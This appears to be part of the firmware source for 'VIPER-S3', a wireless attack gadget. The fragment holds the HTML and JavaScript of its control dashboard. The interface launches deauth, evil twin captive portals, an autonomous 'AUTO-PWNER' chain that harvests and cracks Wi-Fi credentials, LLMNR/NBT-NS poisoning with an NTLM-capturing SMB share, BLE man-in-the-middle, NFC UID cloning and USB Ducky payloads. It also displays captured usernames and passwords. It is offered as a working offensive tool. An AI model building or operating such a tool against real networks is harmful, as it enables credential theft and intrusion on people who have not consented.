    "<div class='card'><h3>BLE MITM Proxy</h3><div class='form-group'><label>Target Name (optional)</label><input id='mitmTarget' value='' placeholder='e.g. Smart Bulb'></div><button class='btn btn-primary btn-sm' onclick='startMitm()'>Start MITM</button> <button class='btn btn-danger btn-sm' onclick='stopMitm()'>Stop</button><div id='mitmStatus' style='margin-top:8px;font-size:12px;color:#888'>Idle</div></div>"
    "</div>"
    "<div class='card'><h3>Discovered GATT Services</h3><div id='mitmServices' style='overflow-x:auto'><div class='empty'>No services discovered yet</div></div></div>"
    "</div>"
    "<div class='panel' id='panel-config'>"
    "<div class='card'><h3>Device Configuration</h3>"
    "<button class='btn btn-primary btn-sm' onclick='loadConfig()' style='margin-bottom:8px'>Refresh</button>"
    "<div id='configForm'><div class='empty'>Click Refresh or switch to Config tab</div></div></div>"
    "</div>"
    "</div>"

    "<div class='panel' id='panel-ir'>"
    "<div class='cards'>"
    "<div class='card'><h3>IR Capture & Replay</h3>"
    "<p style='color:#888;font-size:12px;margin-bottom:12px'>Point remote at device (GPIO 4) and click Capture</p>"
    "<button class='btn btn-primary btn-sm' onclick='captureIr()'>Start Capture</button>"
    "<div id='irResult' style='margin-top:12px'><div class='empty'>Waiting for capture...</div></div>"
    "</div>"
    "<div class='card'><h3>Transmit NEC</h3>"
    "<div class='form-group'><label>Address (Hex)</label><input id='irAddr' value='0x0000'></div>"
    "<div class='form-group'><label>Command (Hex)</label><input id='irCmd' value='0x00'></div>"
    "<button class='btn btn-primary btn-sm' onclick='sendIr()'>Send NEC</button>"
    "</div>"
    "</div>"
    "<div class='card'><h3>Learned Signals</h3>"
    "<div id='irLearned'><div class='empty'>No learned signals found in LittleFS</div></div>"
    "</div>"
    "</div>"
    "<div class='panel' id='panel-nfc'>"
    "<div class='cards'>"
    "<div class='card'><h3>NFC Tag Discovery</h3>"
    "<p style='color:#888;font-size:12px;margin-bottom:12px'>Place tag near PN532 (GPIO 18/5)</p>"
    "<button class='btn btn-primary btn-sm' onclick='detectNfc()'>Scan Tag</button>"
    "<div id='nfcResult' style='margin-top:12px'><div class='empty'>No tag detected</div></div>"
    "</div>"
    "<div class='card'><h3>NFC Cloner</h3>"
    "<p style='color:#888;font-size:12px;margin-bottom:12px'>Copy UID from one tag to another (Magic UID tags required)</p>"
    "<button class='btn btn-danger btn-sm' onclick='cloneNfc()'>Clone Tag</button>"
    "</div>"
    "</div>"
    "</div>"

    "<div class='panel' id='panel-usb'>"
    "<div class='cards'>"
    "<div class='card'><h3>HID Keyboard</h3>"
    "<div class='form-group'><label>Text to Type</label><input id='usbText' value='Hello World'></div>"
    "<button class='btn btn-primary btn-sm' onclick='sendUsbText()'>Type Text</button>"
    "<div style='margin-top:8px'><button class='btn btn-sm btn-warn' onclick='releaseKeys()'>Release All</button></div>"
    "</div>"
    "<div class='card'><h3>Ducky Script</h3>"
    "<div class='form-group'><label>Script</label><textarea id='duckyScript' rows='4' style='width:100%;background:#0a0e17;border:1px solid #2a3a4a;border-radius:4px;color:#e0e0e0;font-size:12px;font-family:monospace'>STRING Hello World\nENTER</textarea></div>"
    "<button class='btn btn-primary btn-sm' onclick='runDucky()'>Run Script</button>"
    "<div style='margin-top:8px'><button class='btn btn-sm btn-primary' onclick='listPayloads()'>List Payloads</button><div id='payloadList' style='margin-top:4px'><div class='empty'>/viper/payloads/</div></div></div>"
    "</div>"
    "<div class='card'><h3>Status</h3>"
    "<div id='usbStatus' style='font-size:12px'><div class='info'>Loading...</div></div>"
    "</div>"
    "</div>"
    "</div>"

    "<div class='panel' id='panel-ai'>"
    "<div class='cards'>"
    "<div class='card'><h3>Digital Twins</h3>"
    "<button class='btn btn-primary btn-sm' onclick='refreshTwins()'>Refresh</button>"
    "<div id='twinList' style='margin-top:8px;overflow-x:auto'><div class='empty'>No twins</div></div>"
    "</div>"
    "<div class='card'><h3>Spawn</h3>"
    "<div class='form-group'><label>Twin Index</label><input id='spawnIdx' value='0'></div>"
    "<div class='form-group'><label>Duration (ms)</label><input id='spawnDur' value='10000'></div>"
    "<button class='btn btn-primary btn-sm' onclick='spawnTwin()'>Spawn BLE</button>"
    "<button class='btn btn-warn btn-sm' onclick='spawnAll()'>Spawn All</button>"
    "</div>"
    "<div class='card'><h3>Models</h3>"
    "<button class='btn btn-sm btn-primary' onclick='refreshModels()'>List Models</button>"
    "<div id='aiModels' style='margin-top:8px'><div class='empty'>No models loaded</div></div>"
    "</div>"
    "</div>"
    "</div>"

    "<div class='panel' id='panel-orchestrator'>"
    "<div class='cards'>"
    "<div class='card'><h3>Attack Chains</h3>"
    "<div class='form-group'><label>Chain</label><select id='chainSelect'><option value='1'>WiFi Recon+EvilTwin</option><option value='4'>BLE MITM</option></select></div>"
    "<button class='btn btn-primary btn-sm' onclick='runChain()'>Run</button>"
    "<button class='btn btn-danger btn-sm' onclick='stopChain()'>Stop</button>"
    "</div>"
    "<div class='card'><h3>Scheduler</h3>"
    "<div class='form-group'><label>Interval (ms)</label><input id='schedInterval' value='60000'></div>"
    "<button class='btn btn-primary btn-sm' onclick='startSchedule()'>Schedule</button>"
    "<button class='btn btn-danger btn-sm' onclick='stopSchedule()'>Unschedule</button>"
    "</div>"
    "<div class='card'><h3>System Health</h3>"
    "<div id='orchHealth' style='font-size:12px'><div class='info'>Loading...</div></div>"
    "</div>"
    "</div>"
    "</div>"

    /* ── AUTO-PWNER Panel ── */
    "<div class='panel' id='panel-autopwn'>"
    "<div class='card' style='border-color:#ff4444;background:linear-gradient(135deg,#1a0a0a,#111b24)'>"
    "<h3 style='color:#ff4444'>&#x26A1; AUTO-PWNER — Autonomous Attack Chain</h3>"
    "<p style='color:#888;font-size:12px;margin-bottom:16px'>"
    "Fully autonomous: scan &rarr; PMKID &rarr; deauth &rarr; evil twin (hotel portal) &rarr; capture creds &rarr; auto-crack"
    "</p>"
    "<div style='margin-bottom:16px'>"
    "<button class='btn btn-danger' id='autopwnBtn' onclick='startAutoPwner()'>&#x26A1; LAUNCH AUTO-PWNER</button>"
    "<button class='btn btn-warn btn-sm' onclick='stopChain()' style='margin-left:8px'>Stop</button>"
    "</div>"
    "<div id='autopwnSteps' style='margin-bottom:16px'>"
    "<div style='display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px'>"
    "<span class='step-badge' id='step-scan'>&#x1f50d; Scan</span>"
    "<span class='step-badge' id='step-pmkid'>&#x1f512; PMKID</span>"
    "<span class='step-badge' id='step-deauth'>&#x26a1; Deauth</span>"
    "<span class='step-badge' id='step-evil_twin'>&#x1f608; Evil Twin</span>"
    "<span class='step-badge' id='step-harvest'>&#x1f3af; Harvest</span>"
    "<span class='step-badge' id='step-crack'>&#x1f513; Crack</span>"
    "</div>"
    "</div>"
    "<div class='log-viewer' id='autopwnLog' style='height:300px'><div class='info'>Waiting to start...</div></div>"
    "</div>"
    "<div class='cards' style='margin-top:12px'>"
    "<div class='card'><h3>Captured Creds</h3><div class='value red' id='autopwnCredCount'>0</div></div>"
    "<div class='card'><h3>Cracked</h3><div class='value green' id='autopwnCrackedCount'>0</div></div>"
    "<div class='card'><h3>Clients Seen</h3><div class='value yellow' id='autopwnClientCount'>0</div></div>"
    "<div class='card'><h3>Last Cracked PW</h3><div class='value green' id='autopwnLastPw' style='font-size:18px'>-</div></div>"
    "</div>"
    "</div>"

    /* ── Map Panel (Canvas network topology) ── */
    "<div class='panel' id='panel-map'>"
    "<div class='card'>"
    "<h3>&#x1f5fa; Live Network Topology</h3>"
    "<div style='display:flex;gap:8px;margin-bottom:8px;font-size:11px;color:#888'>"
    "<span style='color:#00d4aa'>&#x25cf;</span> VIPER-S3 &nbsp;"
    "<span style='color:#4488ff'>&#x25cf;</span> Access Point &nbsp;"
    "<span style='color:#ffaa00'>&#x25cf;</span> Client &nbsp;"
    "<span style='color:#ff4444'>&#x25cf;</span> Targeted"
    "</div>"
    "<canvas id='topoCanvas' width='800' height='500' "
    "style='width:100%;background:#050810;border-radius:6px;border:1px solid #1a2a3a;cursor:crosshair'></canvas>"
    "<div style='margin-top:8px;font-size:11px;color:#555'>Click canvas to refresh &bull; Updates via WebSocket</div>"
    "</div>"
    "</div>"

    "<div class='panel' id='panel-responder'>"
    "<div class='cards'>"
    "<div class='card'><h3>LLMNR/NBT-NS/mDNS Poisoner</h3>"
    "<div class='form-group'><label>Protocol</label><select id='responderProto'><option value='ALL'>ALL</option><option value='LLMNR'>LLMNR</option><option value='NBTNS'>NBT-NS</option><option value='MDNS'>mDNS</option></select></div>"
    "<button class='btn btn-primary btn-sm' onclick='startResponder()'>Start</button>"
    "<button class='btn btn-danger btn-sm' onclick='stopResponder()'>Stop</button>"
    "<div id='responderStatus' style='margin-top:8px;font-size:12px;color:#888'>Idle</div>"
    "</div>"
    "<div class='card'><h3>SMB Honeypot</h3>"
    "<p style='color:#888;font-size:12px;margin-bottom:8px'>Capture NTLM hashes via fake SMB share (port 445)</p>"
    "<button class='btn btn-primary btn-sm' onclick='startSmb()'>Start</button>"
    "<button class='btn btn-danger btn-sm' onclick='stopSmb()'>Stop</button>"
    "<div id='smbStatus' style='margin-top:8px;font-size:12px;color:#888'>Idle</div>"
    "</div>"
    "</div>"
    "<div class='card'><h3>Activity Log</h3><div class='log-viewer' id='responderLog'><div class='info'>Responder idle</div></div></div>"
    "</div>"
    "<div class='panel' id='panel-crack'>"
    "<div class='cards'>"
    "<div class='card'><h3>Submit Hash</h3>"
    "<div class='form-group'><label>Hash Type</label><select id='crackType'><option value='0'>NTLM</option><option value='1'>MD5</option><option value='2'>SHA1</option><option value='3'>SHA256</option></select></div>"
    "<div class='form-group'><label>Hash</label><input id='crackHash' placeholder='e.g. 32 hex chars'></div>"
    "<div class='form-group'><label>Wordlist (optional)</label><input id='crackWordlist' placeholder='default: 10k common'></div>"
    "<button class='btn btn-primary btn-sm' onclick='startCrack()'>Crack Now</button>"
    "</div>"
    "<div class='card'><h3>Engine Status</h3>"
    "<div style='font-size:12px'>"
    "<div style='margin:4px 0'><span style='color:#888'>Cracked:</span> <span id='crackedCount'>0</span></div>"
    "<div style='margin:4px 0'><span style='color:#888'>Attempts:</span> <span id='crackAttempts'>0</span></div>"
    "<div style='margin:4px 0'><span style='color:#888'>NTLM Speed:</span> <span id='ntlmSpeed'>0</span> H/s</div>"
    "<div style='margin:4px 0'><span style='color:#888'>MD5 Speed:</span> <span id='md5Speed'>0</span> H/s</div>"
    "<div style='margin:4px 0'><span style='color:#888'>SHA1 Speed:</span> <span id='sha1Speed'>0</span> H/s</div>"
    "</div>"
    "<button class='btn btn-sm btn-primary' onclick='refreshCrackStatus()' style='margin-top:8px'>Refresh</button>"
    "</div>"
    "</div>"
    "<div class='card'><h3>Last Result</h3><div id='crackResult' class='empty'>Submit a hash to begin</div></div>"
    "</div>"
    "<div class='panel' id='panel-protocol'>"
    "<div class='cards'>"
    "<div class='card'><h3>WPA3→WPA2 Downgrade</h3>"
    "<div class='form-group'><label>Evil Twin SSID</label><input id='dgSsid' value='DowngradeAP'></div>"
    "<button class='btn btn-primary btn-sm' onclick='startDowngrade()'>Start Downgrade</button>"
    "<div id='dgStatus' style='margin-top:8px;font-size:12px;color:#888'>Idle</div>"
    "</div>"
    "<div class='card'><h3>Canary Token</h3>"
    "<div class='form-group'><label>Trigger URL (optional)</label><input id='canaryUrl' placeholder='/api/config'></div>"
    "<button class='btn btn-primary btn-sm' onclick='createCanary()'>Create Token</button>"
    "<div id='canaryResult' style='margin-top:8px;font-size:12px;color:#888'></div>"
    "</div>"
    "<div class='card'><h3>Behavioral Analysis</h3>"
    "<p style='color:#888;font-size:12px;margin-bottom:8px'>Fingerprint network traffic by application type</p>"
    "<button class='btn btn-primary btn-sm' onclick='refreshBehavioral()'>Refresh Results</button>"
    "</div>"
    "</div>"
    "<div class='card'><h3>Canary Tokens</h3><div id='canaryList' class='empty'>No tokens created</div></div>"
    "<div class='card' style='margin-top:12px'><h3>Traffic Fingerprints</h3><div id='behavioralResults' class='empty'>No data collected yet</div></div>"
    "</div></div>"

    "<script>"
    "console.log('VIPER-S3 JS loaded');"
    "var _f=window.fetch;"
    "window.fetch=function(u,opts){"
    "opts=opts||{};opts.headers=opts.headers||{};"
    "opts.headers['X-API-Key']=localStorage.getItem('viper_key')||'viper';"
    "return _f.call(window,u,opts).then(function(r){"
    "if(r.status===401){var k=prompt('API Key required:');if(k){localStorage.setItem('viper_key',k);location.reload()}}"
    "return r;"
    "});"
    "};"
    "let ws=null;let logLines=[];"
    "function connectWS(){"
    "ws=new WebSocket('ws://'+location.host+'/ws');"
    "ws.onopen=function(){document.getElementById('sysLog').innerHTML='<div class=\\'info\\'>Connected</div>'};"
    "ws.onmessage=function(e){"
    "try{var d=JSON.parse(e.data);"
    "if(d.ev=='log'){addLog(d.data);}"
    "if(d.ev=='new_credential'){refreshCaptures();}"
    "if(d.ev=='new_hash'){refreshCaptures();}"
    "}catch(e){}"
    "};"
    "ws.onclose=function(){setTimeout(connectWS,2000)};"
    "}"
    "function addLog(msg){"
    "var el=document.getElementById('sysLog');"
    "var d=document.createElement('div');d.textContent=msg;"
    "if(msg.includes('CRED'))d.style.color='#00ff88';"
    "el.appendChild(d);el.scrollTop=el.scrollHeight;"
    "var act=document.getElementById('activityLog');"
    "if(act){var ad=document.createElement('div');ad.textContent=msg;ad.style.fontSize='11px';act.appendChild(ad);act.scrollTop=act.scrollHeight}"
    "}"
    "function switchPanel(name){"
    "console.log('Switch panel: '+name);"
    "try{"
    "document.querySelectorAll('.nav a').forEach(function(x){x.classList.remove('active')});"
    "var el=document.querySelector('.nav a[data-panel=\"'+name+'\"]');if(el)el.classList.add('active');"
    "document.querySelectorAll('.panel').forEach(function(p){p.classList.remove('active')});"
    "var target=document.getElementById('panel-'+name);"
    "if(target){target.classList.add('active');window.scrollTo(0,0)}else{console.error('Panel not found:',name)}"
    "if(name=='overview')refreshOverview();"
    "if(name=='ble'){refreshProprietary();refreshMitmStatus()}"
    "if(name=='config')loadConfig();"
    "if(name=='responder')refreshResponderStatus();"
    "if(name=='crack')refreshCrackStatus();"
    "if(name=='protocol'){refreshCanaryList();refreshBehavioral()}"
    "if(name=='usb')refreshUsbStatus();"
    "if(name=='ai'){refreshTwins();refreshModels()}"
    "if(name=='orchestrator')refreshHealth();"
    "}catch(e){console.error('switchPanel error:',e)}"
    "return false"
    "}"
    "function scanWifi(){"
    "fetch('/api/attack/start',{method:'POST',body:JSON.stringify({mode:1})}).then(function(){"
    "setTimeout(function(){"
    "fetch('/api/scan').then(function(r){return r.json()}).then(function(d){"
    "var h='<table><tr><th>SSID</th><th>BSSID</th><th>Ch</th><th>RSSI</th><th>Auth</th><th>Vendor</th></tr>';"
    "d.aps.forEach(function(a){h+='<tr><td>'+(a.ssid||'<i>hidden</i>')+'</td><td>'+a.bssid+'</td><td>'+a.ch+'</td><td>'+a.rssi+'</td><td><span class=\\'badge '+authClass(a.auth)+'\\'>'+authName(a.auth)+'</span></td><td>'+a.vendor+'</td></tr>'});"
    "h+='</table>';"
    "document.getElementById('scanResults').innerHTML=h;"
    "});"
"},2000);"
"}).catch(function(){console.error('Scan start failed')});"
"}"
    "function authClass(a){if(a==0)return'open';if(a>=3)return'wpa2';if(a>=5)return'wpa3';return''}"
    "function authName(a){var n=['Open','WEP','WPA-PSK','WPA2-PSK','WPA-WPA2','WPA2-Enterprise','WPA3-PSK','WPA3-Enterprise'];return n[a]||'Unknown'}"
    "function startEvilTwin(){"
    "var ssid=document.getElementById('etSsid').value;"
    "fetch('/api/attack/start',{method:'POST',body:JSON.stringify({mode:3,ssid:ssid})});"
    "}"
    "function startDeauth(){"
    "fetch('/api/attack/start',{method:'POST',body:JSON.stringify({mode:4})});"
    "}"
    "function stopAttack(){"
    "fetch('/api/attack/stop',{method:'POST'});"
    "}"
    "function refreshCaptures(){"
    "fetch('/api/captures/creds').then(function(r){return r.text()}).then(function(text){"
    "try{"
    "var lines=text.trim().split('\\n');"
    "if(!lines||lines[0]===''){document.getElementById('credsList').innerHTML='<div class=\\'empty\\'>No credentials captured yet</div>';return}"
    "var h='<table><tr><th>Source</th><th>Username</th><th>Password</th><th>MAC/IP</th></tr>';"
    "lines.forEach(function(line){"
    "try{var e=JSON.parse(line);if(e&&e.user)h+='<tr><td>'+e.src+'</td><td class=\\'user\\'>'+e.user+'</td><td class=\\'pass\\'>'+e.pass+'</td><td>'+e.mac+'</td></tr>'}catch(ex){}"
    "});"
    "h+='</table>';document.getElementById('credsList').innerHTML=h;"
    "}catch(e){console.error('Captures parse error:',e)}"
    "}).catch(function(e){console.error('Captures fetch error:',e)});"
    "}"
    "function wipeCaptures(){if(confirm('Wipe all captured data?')){fetch('/api/captures/wipe',{method:'POST'}).then(function(){document.getElementById('credsList').innerHTML='<div class=\\'empty\\'>Wiped</div>'})}}"
    "function refreshProprietary(){"
    "fetch('/api/ble/proprietary').then(function(r){return r.json()}).then(function(d){"
    "if(!d.results||d.results.length===0){document.getElementById('propResults').innerHTML='<div class=\\'empty\\'>No proprietary devices found</div>';return}"
    "var h='<table><tr><th>Type</th><th>Battery</th><th>Apple</th><th>Samsung</th><th>Tile</th><th>FindMy</th><th>SwiftPair</th></tr>';"
    "d.results.forEach(function(r){"
    "h+='<tr><td>'+r.type+'</td><td>'+(r.battery>0?r.battery+'%':'N/A')+'</td><td>'+(r.apple?'✓':'')+'</td><td>'+(r.samsung?'✓':'')+'</td><td>'+(r.tile?'✓':'')+'</td><td>'+(r.findmy?'✓':'')+'</td><td>'+(r.swiftpair?'✓':'')+'</td></tr>'"
    "});"
    "h+='</table>';document.getElementById('propResults').innerHTML=h;"
    "});"
    "}"
    "function startMitm(){"
    "var t=document.getElementById('mitmTarget').value;"
    "fetch('/api/ble/mitm/start',{method:'POST',body:JSON.stringify({target:t})}).then(function(r){return r.json()}).then(function(d){"
    "document.getElementById('mitmStatus').textContent=d.ok?'MITM active - listening for connections...':'Failed to start';"
    "if(d.ok){setTimeout(refreshMitmStatus,2000)}"
    "});"
    "}"
    "function stopMitm(){"
    "fetch('/api/ble/mitm/stop',{method:'POST'}).then(function(){"
    "document.getElementById('mitmStatus').textContent='Stopped';"
    "});"
    "}"
    "function refreshMitmStatus(){"
    "fetch('/api/ble/mitm/status').then(function(r){return r.json()}).then(function(d){"
    "var s=d.active?'Active ('+d.state+(d.services>0?', '+d.services+' services':'')+')':'Idle';"
    "s+=' | Target: '+(d.target||'none');"
    "s+=' | Central:'+(d.central?'✓':'✗')+' Peri:'+(d.peripheral?'✓':'✗');"
    "document.getElementById('mitmStatus').textContent=s;"
    "if(d.services>0){"
    "fetch('/api/ble/mitm/services').then(function(r){return r.json()}).then(function(sd){"
    "if(!sd.services)return;var h='<table><tr><th>Svc</th><th>Chars</th><th>Properties</th></tr>';"
    "sd.services.forEach(function(s){"
    "h+='<tr><td>'+s.start+'-'+s.end+'</td><td>';"
    "s.chars.forEach(function(c){h+=c.uuid+' '});"
    "h+='</td><td></td></tr>';"
    "});"
    "h+='</table>';document.getElementById('mitmServices').innerHTML=h;"
    "});"
    "}"
    "if(d.active){setTimeout(refreshMitmStatus,3000)}"
    "});"
    "}"
    "function refreshOverview(){"
    "fetch('/api/status').then(function(r){return r.json()}).then(function(d){"
    "document.getElementById('heapVal').textContent=d.heap_free+' KB';"
    "document.getElementById('heapText').textContent=d.heap_free;"
    "var modes=['Idle','Scanner','Monitor','EvilTwin','Deauth','Beacon','Karma','PMKID','Sniff'];"
    "document.getElementById('wifiModeVal').textContent=modes[d.wifi_mode]||'Unknown';"
    "document.getElementById('wsClientsVal').textContent=d.ws_clients;"
    "var u=d.uptime_ms;var s=Math.floor(u/1000);var m=Math.floor(s/60);s=s%60;document.getElementById('uptimeVal').textContent=m+'m '+s+'s';"
    "});"
    "}"
    "function loadConfig(){"
    "fetch('/api/config').then(function(r){return r.json()}).then(function(d){"
    "var h='<table style=\"font-size:13px\"><tr><th>Setting</th><th>Value</th></tr>';"
    "Object.keys(d).forEach(function(k){h+='<tr><td style=\"color:#888\">'+k+'</td><td>'+JSON.stringify(d[k])+'</td></tr>'});"
    "h+='</table>';"
    "h+='<div style=\"margin-top:12px\"><p style=\"color:#888;font-size:12px\">Edit via POST /api/config with JSON body</p></div>';"
    "document.getElementById('configForm').innerHTML=h;"
    "}).catch(function(){document.getElementById('configForm').innerHTML='<div class=\\'empty\\'>Failed to load config</div>'})"
    "}"
    "var jsCount=0;"
    "setInterval(function(){document.getElementById('jsStatus').textContent='Running ('+(++jsCount)+')'},2000);"
    "setInterval(refreshOverview,5000);"
    "connectWS();"
    "function startResponder(){"
    "var p=document.getElementById('responderProto').value;"
    "var b=p=='ALL'?'{}':JSON.stringify({proto:p});"
    "fetch('/api/responder/start',{method:'POST',body:b}).then(function(r){return r.json()}).then(function(d){"
    "document.getElementById('responderStatus').textContent=d.ok?'Active':'Failed';"
    "if(d.ok){setTimeout(refreshResponderStatus,1000)}"
    "});"
    "}"
    "function stopResponder(){"
    "fetch('/api/responder/stop',{method:'POST'}).then(function(r){return r.json()}).then(function(d){"
    "document.getElementById('responderStatus').textContent='Stopped';"
    "document.getElementById('responderLog').innerHTML='<div class=\\'info\\'>Responder stopped</div>'"
    "});"
    "}"
    "function refreshResponderStatus(){"
    "fetch('/api/responder/status').then(function(r){return r.json()}).then(function(d){"
    "document.getElementById('responderStatus').textContent=d.running?'Active ('+d.poisoned+' poisoned)':'Idle';"
    "if(d.running){setTimeout(refreshResponderStatus,3000)}"
    "});"
    "}"
    "function startSmb(){"
    "fetch('/api/smb/start',{method:'POST'}).then(function(r){return r.json()}).then(function(d){"
    "document.getElementById('smbStatus').textContent=d.ok?'SMB honeypot active on port 445':'Failed';"
    "});"
    "}"
    "function stopSmb(){"
    "fetch('/api/smb/stop',{method:'POST'}).then(function(r){return r.json()}).then(function(d){"
    "document.getElementById('smbStatus').textContent='Stopped';"
    "});"
    "}"
    "function startCrack(){"
    "var t=document.getElementById('crackType').value;"
    "var h=document.getElementById('crackHash').value;"
    "var w=document.getElementById('crackWordlist').value;"
    "if(!h){document.getElementById('crackResult').innerHTML='<div class=\\'empty\\'>Enter a hash</div>';return}"
    "document.getElementById('crackResult').innerHTML='<div class=\\'info\\'>Cracking...</div>';"
    "fetch('/api/crack/start',{method:'POST',body:JSON.stringify({hash:h,type:parseInt(t),wordlist:w})}).then(function(r){return r.json()}).then(function(d){"
    "if(d.found){"
    "document.getElementById('crackResult').innerHTML='<div style=\\'color:#00ff88;font-weight:700\\'>Found: '+d.password+'</div><div style=\\'color:#888;font-size:12px\\'>'+d.attempts+' attempts in '+d.duration_ms+'ms</div>';"
    "}else{"
    "document.getElementById('crackResult').innerHTML='<div style=\\'color:#ffaa00\\'>Not cracked</div><div style=\\'color:#888;font-size:12px\\'>'+d.attempts+' attempts in '+d.duration_ms+'ms</div>';"
    "}"
    "refreshCrackStatus();"
    "}).catch(function(){document.getElementById('crackResult').innerHTML='<div class=\\'empty\\'>Request failed</div>'});"
    "}"
    "function refreshCrackStatus(){"
    "fetch('/api/crack/status').then(function(r){return r.json()}).then(function(d){"
    "document.getElementById('crackedCount').textContent=d.cracked;"
    "document.getElementById('crackAttempts').textContent=d.attempts;"
    "document.getElementById('ntlmSpeed').textContent=d.ntlm_speed;"
    "document.getElementById('md5Speed').textContent=d.md5_speed;"
    "document.getElementById('sha1Speed').textContent=d.sha1_speed;"
    "});"
    "}"
    "function startDowngrade(){"
    "var s=document.getElementById('dgSsid').value;"
    "fetch('/api/downgrade/start',{method:'POST',body:JSON.stringify({ssid:s})}).then(function(r){return r.json()}).then(function(d){"
    "document.getElementById('dgStatus').textContent=d.ok?'Downgrade AP active: '+s:'Failed';"
    "});"
    "}"
    "function createCanary(){"
    "var u=document.getElementById('canaryUrl').value;"
    "fetch('/api/canary/create',{method:'POST',body:JSON.stringify({url:u})}).then(function(r){return r.json()}).then(function(d){"
    "document.getElementById('canaryResult').innerHTML=d.ok?'Token: <code style=\\'color:#00d4aa\\'>'+d.token+'</code><br>URL: <code style=\\'color:#888;font-size:11px\\'>'+d.url+'</code>':'Failed';"
    "if(d.ok){refreshCanaryList()}"
    "});"
    "}"
    "function refreshCanaryList(){"
    "fetch('/api/canary/list').then(function(r){return r.json()}).then(function(d){"
    "if(!d.count||d.count===0){document.getElementById('canaryList').innerHTML='<div class=\\'empty\\'>No tokens created</div>';return}"
    "var h='<table><tr><th>Token</th><th>Hits</th><th>Last Seen</th></tr>';"
    "d.tokens.forEach(function(t){"
    "var ts=t.last_seen>0?new Date(t.last_seen*1000).toLocaleString():'Never';"
    "h+='<tr><td style=\\'color:#00d4aa;font-size:11px\\'>'+t.token+'</td><td>'+t.hits+'</td><td>'+ts+'</td></tr>';"
    "});"
    "h+='</table>';"
    "document.getElementById('canaryList').innerHTML=h;"
    "});"
    "}"
    "function refreshBehavioral(){"
    "document.getElementById('behavioralResults').innerHTML='<div class=\\'info\\'>Analyzing...</div>';"
    "fetch('/api/behavioral').then(function(r){return r.json()}).then(function(d){"
    "if(!d.count||d.count===0){document.getElementById('behavioralResults').innerHTML='<div class=\\'empty\\'>No traffic data yet</div>';return}"
    "var h='<table><tr><th>Application</th><th>Confidence</th><th>Packets</th><th>Avg Size</th><th>Duration</th></tr>';"
    "d.results.forEach(function(r){"
    "h+='<tr><td>'+r.app+'</td><td>'+(r.confidence*100).toFixed(0)+'%</td><td>'+r.pkts+'</td><td>'+r.avg_size+'B</td><td>'+r.duration+'s</td></tr>';"
    "});"
    "h+='</table>';"
    "document.getElementById('behavioralResults').innerHTML=h;"
    "}).catch(function(){document.getElementById('behavioralResults').innerHTML='<div class=\\'empty\\'>Analysis failed</div>'});"
    "}"
    "function captureIr(){"
    "document.getElementById('irResult').innerHTML='<div class=\\'info\\'>Capturing (5s timeout)...</div>';"
    "fetch('/api/ir/capture').then(function(r){return r.json()}).then(function(d){"
    "if(d.ok){"
    "document.getElementById('irResult').innerHTML='<div style=\\'color:#00ff88\\'>Captured: Proto '+d.proto+'</div><div>Addr: 0x'+d.addr.toString(16)+' Cmd: 0x'+d.cmd.toString(16)+'</div>';"
    "document.getElementById('irAddr').value=\"0x\"+d.addr.toString(16);"
    "document.getElementById('irCmd').value=\"0x\"+d.cmd.toString(16);"
    "}else{document.getElementById('irResult').innerHTML='<div style=\\'color:#ff4444\\'>Failed: '+d.error+'</div>'}"
    "});"
    "}"
    "function sendIr(){"
    "var a=parseInt(document.getElementById('irAddr').value);var c=parseInt(document.getElementById('irCmd').value);"
    "fetch('/api/ir/send',{method:'POST',body:JSON.stringify({proto:0,addr:a,cmd:c})});"
    "}"
    "function detectNfc(){"
    "document.getElementById('nfcResult').innerHTML='<div class=\\'info\\'>Scanning...</div>';"
    "fetch('/api/nfc/detect').then(function(r){return r.json()}).then(function(d){"
    "if(d.present){"
    "document.getElementById('nfcResult').innerHTML='<div style=\\'color:#00ff88\\'>Tag Detected</div><div>Type: '+d.type+'</div><div>UID: '+d.uid+'</div><div>Sectors: '+d.sectors+'</div>';"
    "}else{document.getElementById('nfcResult').innerHTML='<div class=\\'empty\\'>No tag detected</div>'}"
    "});"
    "}"
    "function cloneNfc(){if(confirm('Start cloning?')){fetch('/api/nfc/clone',{method:'POST'}).then(function(r){return r.json()}).then(function(d){alert(d.ok?'Cloned!':'Failed')})}}"
    "function refreshUsbStatus(){"
    "fetch('/api/usb/status').then(function(r){return r.json()}).then(function(d){"
    "var oses=['Unknown','Windows','macOS','Linux'];"
    "document.getElementById('usbStatus').innerHTML="
    "'<div>Mode: '+d.mode+'</div>'"
    "+'<div>Host: '+(d.connected?'<span style=\"color:#00ff88\">Connected</span>':'<span style=\"color:#888\">Disconnected</span>')+'</div>'"
    "+'<div>OS: '+oses[d.os]+'</div>'"
    "})"
    "}"
    "function sendUsbText(){"
    "var t=document.getElementById('usbText').value;"
    "fetch('/api/usb/type',{method:'POST',body:JSON.stringify({text:t})})"
    "}"
    "function releaseKeys(){"
    "fetch('/api/usb/release',{method:'POST'})"
    "}"
    "function runDucky(){"
    "var s=document.getElementById('duckyScript').value;"
    "fetch('/api/usb/ducky',{method:'POST',body:JSON.stringify({script:s})})"
    "}"
    "function listPayloads(){"
    "fetch('/api/usb/payloads').then(function(r){return r.json()}).then(function(d){"
    "if(!d.count){document.getElementById('payloadList').innerHTML='<div class=\\'empty\\'>No payloads</div>';return}"
    "var h='<table><tr><th>Payload</th><th>Actions</th></tr>';"
    "d.payloads.forEach(function(n){h+='<tr><td>'+n+'</td><td><button class=\\'btn btn-sm btn-primary\\' onclick=\\'runPayload(\"'+n+'\")\\'>Run</button></td></tr>'})"
    "h+='</table>';document.getElementById('payloadList').innerHTML=h"
    "})"
    "}"
    "function runPayload(name){"
    "fetch('/api/usb/payload/run',{method:'POST',body:JSON.stringify({name:name})})"
    "}"
    "function refreshTwins(){"
    "fetch('/api/ai/twins').then(function(r){return r.json()}).then(function(d){"
    "if(!d.count){document.getElementById('twinList').innerHTML='<div class=\\'empty\\'>No twins</div>';return}"
    "var h='<table><tr><th>Idx</th><th>Type</th><th>Name</th><th>Action</th></tr>';"
    "d.twins.forEach(function(t,i){"
    "h+='<tr><td>'+i+'</td><td>'+t.type+'</td><td>'+t.name+'</td>'"
    "+'<td><button class=\\'btn btn-sm btn-danger\\' onclick=\\'deleteTwin('+i+')\\'>Del</button></td></tr>'"
    "})"
    "h+='</table>';document.getElementById('twinList').innerHTML=h"
    "})"
    "}"
    "function deleteTwin(idx){"
    "fetch('/api/ai/twins/delete',{method:'POST',body:JSON.stringify({index:idx})}).then(function(){refreshTwins()})"
    "}"
    "function spawnTwin(){"
    "var idx=document.getElementById('spawnIdx').value;var dur=document.getElementById('spawnDur').value;"
